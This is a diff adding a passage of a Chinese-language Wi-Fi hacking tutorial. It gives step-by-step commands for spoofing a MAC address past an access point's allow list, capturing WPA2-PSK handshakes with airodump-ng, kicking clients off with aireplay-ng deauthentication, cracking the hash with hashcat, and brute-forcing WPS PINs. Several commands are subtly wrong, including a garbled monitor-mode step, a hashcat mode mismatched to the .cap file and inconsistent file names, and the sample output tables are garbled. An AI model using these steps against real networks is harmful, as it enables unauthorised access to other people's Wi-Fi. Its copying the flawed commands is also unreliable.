@@ -1,0 +1,150 @@
+
+网络接口）。安全工程师会将所有合法用户及其系统的 MAC 地址放入接入点（AP）的管理员界面中。这意味着只有这些 MAC 地址被允许连接，AP 会拒绝其他所有设备。遗憾的是，这种技术在面对一些简单的方法时会彻底失效。
+
+攻击者可以使用 `airodump-ng` 来查找已与该 AP 认证的客户端的 MAC 地址。
+
+```bash
+kali > airodump-ng -c 11 -a -bssid <mac>
+```
+
+一旦攻击者知道了已认证客户端的 MAC 地址，他们就可以简单地“伪装”该 MAC 地址。这要求我们先禁用该接口：
+
+```bash
+kali> ifconfig wlan0 down
+```
+
+然后，使用 `macchanger` 伪装 MAC 地址，使其与已连接客户端的 MAC 地址相同。
+
+```bash
+kali > macchanger -m <mac> wlan0
+```
+
+现在，重新启用该接口，它将拥有与允许连接到 AP 的某个系统相同的 MAC 地址。简单！
+
+```bash
+kali > ifconfig wlan0 up
+```
+
+![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_503_0.png)
+
+一旦攻击者的 MAC 地址与 MAC 过滤白名单中的某个地址匹配，他们就可以不受干扰地连接到 AP。
+
+## 攻击 WPA2-PSK
+
+WPA2-PSK 是 Wi-Fi 路由器中应用最广泛的安全协议。虽然 WPA3 刚刚发布，但尚未广泛部署。因此，让我们关注 WPA2 的破解方法。
+
+与早期的一些 Wi-Fi 黑客技术（例如使用统计技术在几分钟内破解 WEP 密码）不同，针对 WPA2 的策略与第 8 章中介绍的密码破解技术类似。对于 WPA2-PSK，我们首先捕获密码的哈希值，然后使用诸如 `hashcat` 等哈希破解程序应用字典库以找到匹配项。
+
+关键在于捕获在空中传输的密码哈希值。WPA2-PSK 具有一种称为四次握手的机制，密码哈希值在客户端和 AP 之间通过空中进行传输。我们可以在此处捕获它，然后应用我们熟悉的密码哈希破解技术和资源。
+
+```text
+CH 10 ] [ Elapsed: 0 s ] [ 2019-11-01 09:26
+
+BSSID  PWR  Beacons  #Data, #/s  CH  MB  ENC  CIPHER  AUTH  ESSID
+MAC Addresses of AP' s  -55 2 0 0 11 58 WPA2 CCMP PSK HP-Print-E3-Deskje
+-1 0 0 1 -1 <length: 0>
+-63 2 0 0 1 130 WPA2 CCMP PSK TPTv1
+-66 2 0 0 1 130 WPA2 CCMP WGT <length: 0>
+-77 2 0 0 1 195 WPA2 CCMP PSK CenturyLink6236
+-78 6 0 0 10 54e WEP WEP APUH1
+
+BSSID  STATION  PWR  Rate  Lost  Frames  Probe
+F2:A3:A7:5B:63:29 00:1E:8F:8D:18:25 -16 0 - 1 42 13 Mandela2
+(not associated) 52:CC:23:F6:58:E2 -78 0 - 1 0 1
+```
+
+```bash
+root@kali-2019:~# airodump-ng --bssid aa:bb:cc:dd:ee:ff -c 11 --write HackersAriseCrack wlan0mon
+```
+
+第一步是将我们的无线网卡置于监控模式。
+
+```bash
+kali > airodump-ng start wlan0
+```
+
+然后我们启动 `airodump-ng` 以收集信息和数据包。
+
+```bash
+kali > airodump-ng wlan0mon
+```
+
+我们可能希望将数据包捕获集中在单个信道上的单个 AP 上。我们可以通过输入以下命令来实现：
+
+```bash
+kali > airodump-ng -bssid <目标 AP 的 BSSID> -c <AP 正在传输的信道> --write <保存哈希值的文件名> wlan0mon
+```
+
+如果你像我一样缺乏耐心，你可以踢掉一个已经连接到 AP 的客户端，当它重新连接时，你可以使用 `aireplay-ng` 捕获其握手，例如：
+
+```bash
+kali > aireplay-ng -deauth 100 -a AA:BB:CC:DD:EE:FF wlan0mon
+```
+
+![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_505_0.png)
+
+![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_505_1.png)
+
+![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_505_2.png)
+
+其中：
+
+- `aireplay-ng` 是命令
+
+- `--deauth 100` 是向 AP 发送 100 个去认证帧的选项
+
+- `-a <BSSID>` 是目标 AP 的 BSSID
+
+- `wlan0mon` 是处于监控模式的 Wi-Fi 适配器
+
+现在，当客户端重新向 AP 认证时，`airodump-ng` 会自动检测四次握手，将其捕获并写入你指定的文件（`HackersAriseCrack`）。
+
+当我们在当前工作目录执行长列表时，我们会发现 `airodump-ng` 创建了五个文件。第一个文件 `Hackers-AriseCrack-1.cap` 包含用于破解的哈希值。
+
+既然你拥有了握手数据，你只需使用诸如 `hashcat` 等哈希破解程序对密码进行暴力破解。承认吧，这可能是一个缓慢且繁琐的过程，使得选择一个好的字典库至关重要。
+
+```bash
+kali > hashcat -m 16800 HackersAriseCrack-01.cap /root/top10000passwords.txt
+```
+
+如果一开始不成功，请回到第 8 章，使用 `ceWL`、`cup`、`crunch` 或所有三者为目标创建一个自定义字典库。使用这个新的自定义字典库，再次尝试使用 `hashcat` 破解哈希值。
+
+### WPS
+
+许多购买和使用 Wi-Fi AP 的人技术能力有限。对他们来说，设置 Wi-Fi AP 是一项艰巨的任务。为了解决这种情况，行业开发了一种技术，使设置 Wi-Fi AP 变得像按下一个按钮一样简单！这可能出了什么问题？
+
+这项新技术被称为 Wi-Fi Protected Setup 或 WPS。它允许用户只需按下 AP 上的按钮即可设置其 Wi-Fi 接入点。该系统依赖于在 AP 和客户端之间传输 PIN 码以启动其“安全”连接。
+
+该 PIN 码仅使用 0-9 的数字（无特殊字符或字母字符）。PIN 码长度为八位字符（所有字符均为数字），第八位是校验位。更糟糕的是，在剩下的七个字符中，前四个字符进行校验，后三个字符单独进行校验。这意味着可能性数量为 $10^4$（10,000） + $10^3$（1000） = 11,000 个可能的 PIN 码！对于如此少量的 PIN 码，我们的计算机可以在几个小时内测试每一个。
+
+尽管这一漏洞在 2012 年 WPS 2.0 开发中得到缓解，但仍有许多 AP 使用 WPS 1.0 并易受此攻击（我估计约为 10-20%）。要破解 WPS PIN 码，你需要以下信息：
+
+1. 你的接口名称（通常是 `wlan0mon`）
+
+2. AP 的 MAC 地址
+
+3. AP 的 ESSID
+
+4. AP 正在广播的信道
+
+我们可以从 `airodump-ng` 屏幕收集到所有这些信息。
+
+```text
+CH 10 ] [ Elapsed: 0 s ] [ 2019-11-01 09:26
+
+BSSID  #2  PWR  Beacons  #Data, #/s  #4
+                                         CH  MB  ENC  CIPHER  AUTH  ESSID
+MAC Addresses of AP's
+-55 2 0 0 11 58 WPA2 CCMP PSK HP-Print-E3-Deskje
+-63 0 0 0 -1 -1 <length: 0>
+-66 2 0 0 1 130 WPA2 CCMP PSK TPTVI
+-77 2 0 0 1 139 WPA2 CCMP PSK MGT <length: 0>
+-78 6 0 0 1 195 WPA2 CCMP PSK CenturyLink6236
+0 10 54e WEP APHU1
+
+BSSID  STATION  PWR  Rate  Lost  Frames  Probe
+F2:A3:A7:5B:63:29 00:1E:8F:8D:18:25 -16 0 - 1 42 13 Mandela2
+(not associated) 52:CC:23:F6:58:E2 -78 0 - 1 0 1
+```
+
+![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_508_0.png)
